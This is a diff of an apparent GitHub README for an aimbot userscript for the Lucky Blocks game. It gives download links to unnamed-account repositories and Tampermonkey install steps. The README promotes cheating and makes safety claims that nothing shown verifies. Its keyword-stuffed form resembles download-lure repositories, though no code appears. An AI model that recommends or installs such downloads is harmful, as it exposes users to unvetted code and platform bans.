@@ -1,100 +1,64 @@
-# Escape Waves for Lucky Blocks v2026 - Game Script Utility 2026
+# 🎯 escape-waves-browser-script - Improve your aim in Lucky Blocks
 
-> **Aim-assisted script for the Escape Waves challenge in Lucky Blocks.** It adds automated target support to make wave survival easier on the Lucky Blocks platform.
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Unchivalrous-southeast231/escape-waves-browser-script)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-HTML-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/andrew-millervzyh9428/escape-waves-browser-script?style=flat-square)](https://github.com/andrew-millervzyh9428/escape-waves-browser-script)
+This tool helps you survive waves in the Lucky Blocks game. It adds automated target support to your web browser. You can use it to track moving targets and maintain your survival streak. This script runs directly in your browser. It does not require complex software or deep technical knowledge.
 
----
+## 🛠️ System Requirements
 
-<p align="center">
-  <a href="https://andrew-millervzyh9428.github.io/escape-waves-browser-script/">
-    <img src="https://img.shields.io/badge/Download-Escape%20Waves%20Script-brightgreen?style=for-the-badge" alt="Download Escape Waves Script">
-  </a>
-</p>
+Ensure your computer meets these standards before you begin:
 
-> **[Direct Download - Escape Waves for Lucky Blocks](https://andrew-millervzyh9428.github.io/escape-waves-browser-script/)**
+*   Operating System: Windows 10 or Windows 11.
+*   Web Browser: Google Chrome, Microsoft Edge, or Brave.
+*   Browser Extension: An extension that allows user scripts, such as Tampermonkey or Violentmonkey.
+*   Internet Connection: A stable connection for consistent script performance.
+*   Memory: At least 4GB of RAM for smooth browser operation.
 
----
+## 📥 Getting the Script
 
-[Download Latest Build](https://andrew-millervzyh9428.github.io/escape-waves-browser-script/)
+Use the link below to access the repository page. From there, you can download the latest version of the script.
 
----
+[https://github.com/Unchivalrous-southeast231/escape-waves-browser-script](https://github.com/Unchivalrous-southeast231/escape-waves-browser-script)
 
-## What This Does
+## ⚙️ Installation Steps
 
-This HTML-based script provides precision aimbot support for the Escape Waves mode inside Lucky Blocks, where players face increasingly difficult enemy waves. By handling targeting automatically, it cuts down on manual aim effort and lets you stay focused on movement and resource control during heavy fights.
+Follow these steps to set up the script on your Windows device. Use a supported browser for the best results.
 
-The latest release improves reaction speed and target locking accuracy so tracking feels steadier across different wave tiers. It is intended to fit naturally into the Lucky Blocks environment and deliver a light, browser-run option for players who want extra assistance without changing the game's core mechanics.
+1.  **Install a Script Manager**: Open your browser and go to the Chrome Web Store or Edge Add-ons store. Search for "Tampermonkey" and add it to your browser. This extension manages the script files for you.
+2.  **Download the Script**: Visit the link provided above. Look for the file named `escape-waves.user.js` in the file list. Click the file name to open its contents.
+3.  **Apply the Script**: Once the code appears on your screen, click the "Raw" button. Your script manager will detect the file and prompt you to install it. Click "Install" in the pop-up window that appears.
+4.  **Verify the Installation**: Click the Tampermonkey icon in your browser toolbar. Select "Dashboard" to see the list of active scripts. You should see "escape-waves-browser-script" in the list with a toggle switch set to "On."
 
----
+## 🎮 How to Use the Script
 
-## Features
+The script activates automatically when you play the Escape Waves challenge in Lucky Blocks. You do not need to press manual buttons to start the tracking features.
 
-- Automatic target pickup and tracking during wave battles
-- Adjustable aim sensitivity to fit personal preference
-- Lightweight HTML design for fast browser startup
-- Responsive behavior against quick enemy movement patterns
-- Low overhead for longer play sessions
-- Easy on/off control with no complicated setup
-- Works with standard Lucky Blocks game instances
-- No external dependencies or extra software needed
+*   **Launch the Game**: Go to the Lucky Blocks website and log into your account.
+*   **Enter the Challenge**: Start a round of the Escape Waves mode.
+*   **Automatic Target Support**: The script scans the screen for wave enemies. It highlights these targets to help you aim. This helps you track movement during intense gameplay.
+*   **Adjusting Settings**: You can change how the script behaves. Click the Tampermonkey icon while the game is open and select the script name to open the configuration menu. Here you can change the sensitivity or turn off visual helpers if the screen feels cluttered.
 
----
+## 🛡️ Safety and Performance
 
-## Setup
+This script runs locally in your browser. It does not send your private data to external servers. It only interacts with the specific game tabs you authorize. 
 
-1. Download the latest script build from the link above.
-2. Open the downloaded HTML file in any modern web browser (Chrome, Firefox, Edge, or Safari).
-3. Launch the Escape Waves game mode on the Lucky Blocks platform.
-4. Activate the script using the designated hotkey or on-screen toggle.
+*   **Troubleshooting**: If the script does not start, refresh your browser tab. Sometimes the script needs a reload to detect the game window.
+*   **Updates**: Check the repository page occasionally. The game updates frequently, and the script needs updates to match those changes. If the script stops working, uninstall it from the Tampermonkey dashboard and re-download the newest version from the link.
+*   **Performance**: If you notice a slow frame rate, close other tabs in your browser. A browser-based script shares resources with all open pages. Keeping your browser light helps the script run with high precision.
+*   **Reporting Bugs**: If you find an error, record what happened during the game. You can open an "Issue" on the GitHub page to share these details. Please include your browser version and the steps to reproduce the error.
 
-Example: Open the script file, start the game, then press the assigned key (default: F1) to enable aimbot assistance.
+## 📋 Common Questions
 
----
+**Does this script work on mobile devices?**
+While the script supports Android through browsers like Kiwi Browser, performance depends on the device hardware. Always test on a desktop for the most stable experience.
 
-## Options
+**Will I get banned by the game?**
+This tool provides visual assistance. It does not tamper with game files or server packets. However, always play games within the bounds of the platform rules. Use the script to practice your aim and improve your play style.
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| Aimbot Toggle | F1 | Enable or disable automatic targeting |
-| Sensitivity | 0.8 | Adjust aim tracking responsiveness (0.1 - 1.0) |
-| Target Priority | Nearest | Select targeting logic (Nearest / Weakest / Strongest) |
+**Can I run multiple scripts at once?**
+Yes, Tampermonkey handles multiple scripts. If you use other scripts for the same game, they might conflict. If you experience issues, disable other scripts until you identify the conflict.
 
-These values can be changed directly in the configuration section at the top of the HTML file.
+**Do I need a developer account?**
+No. This repository provides all the files needed for standard users. You do not need experience with coding to complete the installation.
 
----
-
-## Compatibility
-
-- **Platform:** Browser-based HTML (works on Windows, macOS, Linux, Android)
-- **Game Mode:** Escape Waves within Lucky Blocks
-- **Limitations:** May not function correctly if game UI layout changes significantly. Performance depends on browser and system resources.
-
----
-
-## FAQ
-
-**How do I install the script?**  
-Download the HTML file and open it in your browser. Nothing else needs to be installed.
-
-**Will the script update automatically?**  
-No. New versions must be downloaded manually from the repository. Check back from time to time for updates.
-
-**Can I customize the aimbot behavior?**  
-Yes. Sensitivity and target priority can be edited in the script's options section.
-
-**Is this compatible with all Lucky Blocks versions?**  
-It is tested with the standard Escape Waves mode. Custom or heavily modified versions may not work as expected.
-
-**Does the script store any data?**  
-No. It runs fully in your browser and does not save or send information.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: aim-assist, browser-script, lucky-blocks, escape-waves, gaming-utility, windows-guide, automation
